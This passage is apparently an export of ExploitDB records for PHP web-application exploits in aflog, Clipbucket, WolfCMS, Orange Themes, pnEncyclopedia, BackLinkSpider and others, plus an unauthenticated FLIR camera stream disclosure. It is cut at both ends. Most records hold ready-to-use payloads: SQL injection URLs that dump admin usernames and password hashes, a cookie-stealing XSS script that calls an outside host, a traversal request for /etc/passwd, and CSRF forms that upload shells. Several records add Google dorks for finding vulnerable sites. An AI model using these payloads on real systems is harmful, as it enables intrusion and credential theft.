Injection', u'platform': u'php', u'author': u'L0rd CrusAd3r', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-06-23T00:00:00+00:00', u'_id': 13997, u'type': u'webapps', u'port': 0}

CVE: []
Description: aflog 1.01 - Cross-Site Scripting / SQL Injection
{u'code': u'# Name: aflog 1.01 (and possibly earlier)\r\n# Webiste: http://aflog.org/\r\n# Vulnerability type: SQL Injection (comments.php) and XSS\r\n# Author:\r\n#         shinmai, 2008-01-22\r\n###############################################################################\r\n# Description:\r\n#\r\n# SQL INJECTION:\r\n#\r\n# SQL injection is possible in comments.php for the GET variable \'id\', like\r\n# this:\r\nhttp://hostname/aflog/comments.php?id=\'[SQLI]/*\r\n# The following POC exposes the username and password of the first registered\r\n# user (the admin):\r\n\r\nhttp://localhost/aflog/comments.php?id=\'+UNION+SELECT+666,null,concat(\'username:\',username,\',password:\',password),1,null,1+FROM+members+ORDER+BY+id+DESC+LIMIT+1/*\r\n\r\n#\r\n# The same principle could be applied to view.php, but forming the SQL\r\n# injection string is easier in comments.php, IMHO.\r\n#\r\n# NOTE:\r\n# A possible sollution to this is setting magic_quotes_gpc to "on" but this is\r\n# viable to cause other problems, so a patch to aflog would be more benefitial.\r\n#\r\n###############################################################################\r\n#\r\n# XSS\r\n#\r\n# The comment form doesn\'t do much parsing on comments posted, other than their\r\n# length.\r\n#\r\n# A newly registered user can easily compose an URL with an XSS exploit and\r\n# trick a logged in user to click it to steal their login cookie.\r\n#\r\n#   Example comment:\r\n\r\nDon\'t go <script>var a="<a\r\nhref=\'http://server/stealcookies?"+encodeURI(document.cookie)+"\'>here</a>";document.write(a);</script>.\r\n\r\n#\r\n# Cliking this link would send the login cookie as a GET request to \'server\' to\r\n# be processed by a script called \'stealcookies\'\r\n#\r\n# Good luck, and be safe. Greetings to the light of my life, innoscent.\r\n#\r\n\r\n# milw0rm.com [2008-01-22]', u'description': u'aflog 1.01 - Cross-Site Scripting / SQL Injection', u'platform': u'php', u'author': u'shinmai', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-01-22T00:00:00+00:00', u'_id': 4958, u'type': u'webapps', u'port': 0}

CVE: []
Description: Clipbucket 2.7 RC3 0.9 - Blind SQL Injection
{u'code': u"# Exploit Title   : Clipbucket 2.7 RC3 0.9 Blind SQL Injection\r\n# Date            : 20 February 2015\r\n# Exploit Author  : CWH Underground\r\n# Site            : www.2600.in.th\r\n# Vendor Homepage : http://clip-bucket.com/\r\n# Software Link   : http://sourceforge.net/projects/clipbucket/files/ClipBucket%20v2/clipbucket-2.7.0.4.v2929-rc3.zip\r\n# Version         : 2.7.0.4.v2929-rc3\r\n# Tested on       : Window and Linux\r\n   \r\n  ,--^----------,--------,-----,-------^--,\r\n  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..\r\n  `+---------------------------^----------|\r\n    `\\_,-------, _________________________|\r\n      / XXXXXX /`|     /\r\n     / XXXXXX /  `\\   /\r\n    / XXXXXX /\\______(\r\n   / XXXXXX /       \r\n  / XXXXXX /\r\n (________(         \r\n  `------'\r\n  \r\n####################\r\nSOFTWARE DESCRIPTION\r\n####################\r\n  \r\nClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all\r\nthe bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any\r\nother top video distribution application in matter of minutes. ClipBucket is fastest growing script which was\r\nfirst started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable &\r\nscalable media distribution platform with latest social networking features, while staying light on your pockets.\r\nWhether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video\r\nmanagement needs.\r\n  \r\n##################################\r\nVULNERABILITY: Blind SQL Injection\r\n##################################\r\n   \r\nAn attacker might execute arbitrary SQL commands on the database server with this vulnerability.\r\nUser tainted data is used when creating the database query that will be executed on the database management system (DBMS).\r\nAn attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system\r\ndepending on the query, DBMS and configuration.\r\n  \r\n= POC =\r\nGET /clipbucket/view_item.php?item=a%27%20or%20%27a%27=%27a&type=photos&collection=9\t=> True Condition\r\nGET /clipbucket/view_item.php?item=a%27%20or%20%27a%27=%27b&type=photos&collection=9\t=> False Condition (Item does not exist.)\r\n   \r\n################################################################################################################\r\n Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2\r\n################################################################################################################", u'description': u'Clipbucket 2.7 RC3 0.9 - Blind SQL Injection', u'platform': u'php', u'author': u'CWH Underground', u'cve': [], u'source': u'ExploitDB', u'date': u'2015-02-23T00:00:00+00:00', u'_id': 36156, u'type': u'webapps', u'port': 80}

CVE: [u'CVE-2018-8813']
Description: WolfCMS 0.8.3.1 - Open Redirection
{u'code': u'#######################################\r\n# Exploit Title: WolfCMS 0.8.3.1 Open Redirection Vulnerability\r\n# Google Dork: N/A\r\n# Date: 04-04-2018\r\n#######################################\r\n# Exploit Author: Sureshbabu Narvaneni#\r\n#######################################\r\n# Author Blog : http://nullnews.in\r\n# Vendor Homepage: http://www.wolfcms.org\r\n# Software Link: https://bitbucket.org/wolfcms/wolf-cms-downloads/downloads/wolfcms-0.8.3.1.zip\r\n# Affected Version: 0.8.3.1\r\n# Category: WebApps\r\n# Tested on: Win7 Enterprise x86/Kali Linux 4.12 i686\r\n# CVE : CVE-2018-8813\r\n#\r\n# 1. Vendor Description:\r\n#\r\n# Light-weight, fast, simple and powerful CMS. PHP-based, easily extended CMS. Uses MySQL, SQLite or (from 0.7)\r\n# PostgreSQL for db. Simple drag & drop page hierarchy. Open source, licensed under GPLv3.\r\n#\r\n# 2. Technical Description:\r\n#\r\n# Open redirect vulnerability in the login[redirect] parameter login\r\nfunctionality in WolfCMS before 0.8.3.1 allows\r\n# remote attackers to redirect users to arbitrary web sites and conduct\r\nphishing attacks via a malformed URL.\r\n#\r\n# 3. Proof Of Concept:\r\n#\r\n#  Navigate to http://[URL]/wolfcms/?/admin/login\r\n#  Enter the credentials and replace login[redirect] to any url.\r\n#  You can see the unvalidated redirect.\r\n#\r\n# 4. Solution:\r\n#\r\n# Upgrade to latest release.\r\n# http://www.wolfcms.org/blog.html\r\n#\r\n# 5. Reference:\r\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8813\r\n# https://github.com/wolfcms/wolfcms/issues/670\r\n#####################################', u'description': u'WolfCMS 0.8.3.1 - Open Redirection', u'platform': u'php', u'author': u'Sureshbabu Narvaneni', u'cve': [u'CVE-2018-8813'], u'source': u'ExploitDB', u'date': u'2018-04-09T00:00:00+00:00', u'_id': 44421, u'type': u'webapps', u'port': 80}

CVE: []
Description: Prozilla Hosting Index - 'cat_id' SQL Injection
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_88$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_88$2008] Prozilla Hosting Index (directory.php cat_id) Blind Sql Injection Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : April, 28 th 2007\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv88-K-159-2008.txt\r\nCritical Lvl   : Medium\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Hosting Index\r\nversion       : unknown\r\nVendor        : http://www.prozilla.com/item.php?item=26\r\nDescription   :\r\n\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "cat_id" parameter in directory.php is not properly verified before being used to sql query. \r\nThis can be exploited thru the browser and get the hash md5 password from users.\r\nSuccessful exploitation requires that "magic_quotes" is off\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/[hostindex_path]/directory.php?ax=list&sub=7&cat_id=-1%20union%20select%201,2,concat(id,0x3a,name,0x3a,email,0x3a,password),4,5,6,7,8,9,10,11,12,13,14%20from%20links--\r\n\r\nDork:\r\n~~~~\r\nGoogle: "inurl:directory.php?ax=list" Hosting Directory\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn on magic_quotes in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 15 - 12 - 2007 bug found\r\n- 28 - 04 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,fuzk3_k3ndi,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-04-28]', u'description': u"Prozilla Hosting Index - 'cat_id' SQL Injection", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-04-28T00:00:00+00:00', u'_id': 5516, u'type': u'webapps', u'port': 0}

CVE: []
Description: Clipbucket 2.5 - Blind SQL Injection
{u'code': u'# Author: loneferret of Offensive Security\r\n# Product: ClipBucket\r\n# Version: 2.5 (and maybe older versions)\r\n# Vendor Site: http://clip-bucket.com/\r\n# Software Download: http://sourceforge.net/projects/clipbucket/\r\n\r\n# Software description:\r\n# ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all\r\n# the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any\r\n# other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was\r\n# first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable &\r\n# scalable media distribution platform with latest social networking features, while staying light on your pockets.\r\n# Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video\r\n# management needs.\r\n \r\n# Vulnerability:\r\n# Blind SQLi\r\n# Due to improperly sanitized user input a SQL Injection is present in the "Forgot Password" page.\r\n\r\n# PoC:\r\n# Page: http://<server>/forgot.php\r\n# Field: Username\r\n# Payload: -1\' or sleep(5) and \'1\'=\'1\r\n\r\n# Host: 172.16.194.148\r\n# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n# Accept-Language: en-us,en;q=0.5\r\n# Accept-Encoding: gzip, deflate\r\n# DNT: 1\r\n# Connection: keep-alive\r\n# Referer: http://172.16.194.148/upload/forgot.php\r\n# Cookie: quick_list_box=show; current_style=list_view; sess_salt=5f3f5; fws_guest=81172578; sk-id=-305383665; PHPSESSID=0c1519dace9f217955cdc58ac55b28b2\r\n# Content-Type: application/x-www-form-urlencoded\r\n# Content-Length: 68\r\n\r\n# forgot_username=-1%27+or+sleep%285%29+and+%271%27%3D%271&reset=Reset', u'description': u'Clipbucket 2.5 - Blind SQL Injection', u'platform': u'php', u'author': u'loneferret', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-08-21T00:00:00+00:00', u'_id': 20708, u'type': u'webapps', u'port': 0}

CVE: []
Description: Clipbucket 2.5 - Directory Traversal
{u'code': u'# Author: loneferret of Offensive Security\r\n# Product: ClipBucket \r\n# Version: 2.5 (and maybe older versions)\r\n# Vendor Site: http://clip-bucket.com/\r\n# Software Download: http://sourceforge.net/projects/clipbucket/\r\n\r\n# Software description:\r\n# ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all\r\n# the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any \r\n# other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was\r\n# first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable & \r\n# scalable media distribution platform with latest social networking features, while staying light on your pockets. \r\n# Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video \r\n# management needs. \r\n\r\n# Vulnerability:\r\n# Directory Traversal.\r\n\r\n# PoC:\r\nPOST /upload/actions/file_results.php HTTP/1.1\r\nContent-Length: 57\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=14f5142809e19acf92ebe405a907371e; pageredir=http%3A%2F%2F172.16.194.148%2Fupload%2F; user_1=watched; user_2=watched; quick_list_box=show; CBadminBar=hidden; current_style=list_view\r\nHost: 172.16.194.148\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\r\nAccept: */*\r\n\r\nfile_name=../../../../../../../../../../etc/passwd%00.jpg', u'description': u'Clipbucket 2.5 - Directory Traversal', u'platform': u'php', u'author': u'loneferret', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-08-21T00:00:00+00:00', u'_id': 20704, u'type': u'webapps', u'port': 0}

CVE: []
Description: Multiple WordPress Orange Themes - Cross-Site Request Forgery (Arbitrary File Upload)
{u'code': u'#Title : Wordpress Orange Themes CSRF File Upload Vulnerability\r\n#Author : Jje Incovers\r\n#Date : 01/12/2013 - 17 November 2013\r\n#Category : Web Applications\r\n#Type : PHP\r\n#Vendor : http://www.orange-themes.com/\r\n#Download : http://www.orange-themes.com/portfolio/\r\n#Tested : Mozila, Chrome, Opera -> Windows & Linux\r\n#Vulnerabillity : CSRF\r\n#Scanning Theme : [ Agritourismo , Forca , Grandis , Legatus , Reganto , Sportimo , Piccione , Bulteno , Coloris , Botanica , Project 10 , Pinword , Rockstar , Kernel , Bordeaux , Radial , Oxygen , Ray Of Light , Gadgetine ] -theme\r\n\r\n#Dork : \r\ninurl:"/wp-content/themes/agritourismo-theme/"\r\ninurl:"/wp-content/themes/bordeaux-theme/"\r\ninurl:"/wp-content/themes/bulteno-theme/"\r\ninurl:"/wp-content/themes/oxygen-theme/"\r\ninurl:"/wp-content/themes/radial-theme/"\r\ninurl:"/wp-content/themes/rayoflight-theme/"\r\ninurl:"/wp-content/themes/reganto-theme/"\r\ninurl:"/wp-content/themes/rockstar-theme/"  \r\n\r\nCSRF File Upload Vulnerability\r\n\r\nExploit & POC : \r\n\r\nhttp://site-target/wp-content/themes/rockstar-theme/functions/upload-handler.php\r\n\r\nScript :\r\n\r\n<form enctype="multipart/form-data"\r\naction="http://127.0.0.1/wp-content/themes/rockstar-theme/functions/upload-handler.php" method="post"> \r\nYour File: <input name="uploadfile" type="file" /><br /> \r\n<input type="submit" value="upload" /> \r\n</form> \r\n\r\n\r\nFile Access :\r\n\r\nhttp://site-target/wp-content/uploads/[years]/[month]/your_shell.php\r\n\r\nExample : http://127.0.0.1/wp-content/uploads/2013/13/inc0vers.php\r\n\r\nNote :\r\nScript CSRF equate with dork you use\r\n\r\n########################################\r\n#Greetz : 0day-id.com | newbie-security.or.id | SANJUNGAN JIWA\r\n#Thanks : Akira | Xie Log | - SANJUNGAN JIWA\r\n########################################', u'description': u'Multiple WordPress Orange Themes - Cross-Site Request Forgery (Arbitrary File Upload)', u'platform': u'php', u'author': u'Jje Incovers', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-12-01T00:00:00+00:00', u'_id': 29946, u'type': u'webapps', u'port': 0}

CVE: [u'CVE-2018-8814']
Description: WolfCMS 0.8.3.1 - Cross-Site Request Forgery
{u'code': u'#######################################\r\n# Exploit Title: WolfCMS 0.8.3.1 Cross Site Request Forgery\r\n# Google Dork: N/A\r\n# Date: 04-04-2018\r\n#######################################\r\n# Exploit Author: Sureshbabu Narvaneni#\r\n#######################################\r\n# Author Blog : http://nullnews.in\r\n# Vendor Homepage: http://www.wolfcms.org\r\n# Software Link:\r\n\r\n# Affected Version: 0.8.3.1\r\n# Category: WebApps\r\n# Tested on: Win7 Enterprise x86/Kali Linux 4.12 i686\r\n# CVE : CVE-2018-8814\r\n#\r\n# 1. Vendor Description:\r\n#\r\n# Light-weight, fast, simple and powerful CMS. PHP-based, easily extended\r\nCMS. Uses MySQL, SQLite or (from 0.7)\r\n# PostgreSQL for db. Simple drag & drop page hierarchy. Open source,\r\nlicensed under GPLv3.\r\n#\r\n# 2. Technical Description:\r\n#\r\n# Cross-site request forgery (CSRF) vulnerability in WolfCMS before 0.8.3.1\r\nallows remote attackers to hijack the\r\n# authentication of users for requests that modify\r\nplugin/[pluginname]/settings and can uninstall plugins by sending\r\n# malicious request.\r\n#\r\n# 3. Proof Of Concept:\r\n#\r\n# Send below request to logged in user to change the plugin settings.\r\n#\r\n#<html>\r\n#  <body>\r\n#    <form action="http://[URL]/wolf/wolfcms/?/admin/plugin/archive/save"\r\nmethod="POST">\r\n#      <input type="hidden" name="settings&#91;use&#95;dates&#93;"\r\nvalue="1" />\r\n#      <input type="hidden" name="commit" value="Save" />\r\n#      <input type="submit" value="Submit request" />\r\n#    </form>\r\n#     <script>\r\n#      document.forms[0].submit();\r\n#            </script>\r\n# </body>\r\n#</html>\r\n#\r\n# Share the below URL to uninstall any plugin remotely.\r\n#\r\n# http://[url]/wolfcms/?/admin/setting/uninstall_plugin/[pluginname]\r\n#\r\n#\r\n# 4. Solution:\r\n#\r\n# Upgrade to latest release.\r\n# http://www.wolfcms.org/blog.html\r\n#\r\n# 5. Reference:\r\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8814\r\n# https://github.com/wolfcms/wolfcms/issues/671\r\n#####################################', u'description': u'WolfCMS 0.8.3.1 - Cross-Site Request Forgery', u'platform': u'php', u'author': u'Sureshbabu Narvaneni', u'cve': [u'CVE-2018-8814'], u'source': u'ExploitDB', u'date': u'2018-04-09T00:00:00+00:00', u'_id': 44418, u'type': u'webapps', u'port': 0}

CVE: []
Description: FLIR Thermal Camera F/FC/PT/D - Stream Disclosure
{u'code': u"FLIR Systems FLIR Thermal Camera F/FC/PT/D Stream Disclosure\r\n\r\n\r\nVendor: FLIR Systems, Inc.\r\nProduct web page: http://www.flir.com\r\nAffected version: Firmware version: 8.0.0.64\r\n                  Software version: 10.0.2.43\r\n                  Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2\r\n                  FC-Series S (FC-334-NTSC)\r\n                  FC-Series ID\r\n                  FC-Series-R\r\n                  PT-Series (PT-334 200562)\r\n                  D-Series\r\n                  F-Series\r\n\r\nSummary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras\r\nbring thermal and visible-light imaging together in a system that gives you\r\nvideo and control over both IP and analog networks. The PT-Series' precision\r\npan/tilt mechanism gives you accurate pointing control while providing fully\r\nprogrammable scan patterns, radar slew-to-cue, and slew-to-alarm functions.\r\nPT-Series cameras define a new standard of performance with five models that\r\nprovide full 640x480 thermal resolution.\r\n\r\nDesc: FLIR suffers from an unauthenticated and unauthorized live stream disclosure.\r\n\r\nTested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le\r\n           Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082\r\n           Nexus Server/2.5.29.0\r\n           Nexus Server/2.5.14.0\r\n           Nexus Server/2.5.13.0\r\n           lighttpd/1.4.28\r\n           PHP/5.4.7\r\n\r\n\r\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\r\n                            @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2017-5435\r\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5435.php\r\n\r\n\r\n23.03.2017\r\n\r\n--\r\n\r\n\r\nPoC:\r\n\r\nhttp://TARGET:8081/graphics/livevideo/stream/stream3.jpg\r\nhttp://TARGET:8081/graphics/livevideo/stream/stream1.jpg", u'description': u'FLIR Thermal Camera F/FC/PT/D - Stream Disclosure', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-09-25T00:00:00+00:00', u'_id': 42789, u'type': u'webapps', u'port': 0}

CVE: []
Description: PostNuke Module pnEncyclopedia 0.2.0 - SQL Injection
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_90$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_90$2008] PostNuke Module pnEncyclopedia <= 0.2.0 (id) Blind Sql Injection Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : May, 5 th 2008\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv90-K-159-2008.txt\r\nCritical Lvl   : Medium\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : pnEncyclopedia\r\nversion       : <= 0.2.0\r\nVendor        : http://sourceforge.net/projects/pnencyclopedia/\r\nDescription   :\r\n\r\nEncyclopedia intended for the creation of the open encyclopedia on a PostNuke website.\r\nUsers can submit new terms and offer changes to current ones but an editor can accept or reject the requested changes.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "id" parameter is not properly verified before being used to sql query. \r\nThis can be exploited thru the browser and get the username and hash md5 password from users.\r\nSuccessful exploitation requires that "magic_quotes" is off\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/index.php?module=pnEncyclopedia&func=display_term&id=9999 union select 1,2,3,4,5,6,version(),8,9,10,11--\r\nhttp://www.target.com/index.php?module=pnEncyclopedia&func=display_term&id=9999 union select 1,2,3,4,5,6,load_file(0x2f6574632f706173737764),8,9,10,11--\r\nhttp://www.target.com/index.php?module=pnEncyclopedia&func=display_term&id=9999 union select 1,2,3,4,5,6,concat(pn_uname,0x3a,pn_pass),8,9,10,11 from nuke_users limit 1,1--\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "index.php?module=pnEncyclopedia" "allinurl:index.php?module=pnEncyclopedia"\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn on magic_quotes in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 01 - 05 - 2008 bug found\r\n- 05 - 05 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-05-05]', u'description': u'PostNuke Module pnEncyclopedia 0.2.0 - SQL Injection', u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-05-05T00:00:00+00:00', u'_id': 5541, u'type': u'webapps', u'port': 0}

CVE: []
Description: BackLinkSpider 1.1 - 'cat_id' SQL Injection
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_95$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_95$2008] BackLinkSpider (cat_id) Blind Sql Injection Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : May, 5 th 2008\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv95-K-159-2008.txt\r\nCritical Lvl   : Medium\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : BackLinkSpider\r\nversion       : unknown\r\nVendor        : http://www.backlinkspider.com/\r\nDescription   :\r\n\r\nBackLinkSpider is a free link exchange service designed to provide you with access to a growing number of link exchange partners in our link directory page\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "cat_id" parameter in backlinkspider\'s page is not properly verified before being used to sql query. \r\nThis can be exploited to execute sql query through the browser.\r\nSuccessful exploitation requires that "magic_quotes" is enabled.\r\n\r\n\r\nPoc/Exploit:\r\n\r\n~~~~~~~~~\r\nhttp://www.target.com/[backlinkspider_page_name].php?cat_id=[SQL]\r\nhttp://www.target.com/[backlinkspider_page_name].php?cat_id=-1%20union%20select%201,2,3,4,5,6,7,8,9,0,1,version(),3,4,5,6,7,8,9,0/*\r\n\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "Powered By BackLinkSpider" "inurl:backlinkspider.php"\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn on magic_quotes in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 03 - 05 - 2008 bug found\r\n- 05 - 05 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-05-05]', u'description': u"BackLinkSpider 1.1 - 'cat_id' SQL Injection", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-05-05T00:00:00+00:00', u'_id': 5546, u'type': u'webapps', u'port': 0}

CVE: []
Description: Online Rental Property Script 4.5 - 'pid' SQL Injection
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_91$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_91$2008] Online Rental Property Script <= 4.5 (pid) Blind Sql Injection Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : May, 5 th 2008\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv91-K-159-2008.txt\r\nCritical Lvl   : Medium\r\nImpact\t       : System access\r\nWhere\t       : From 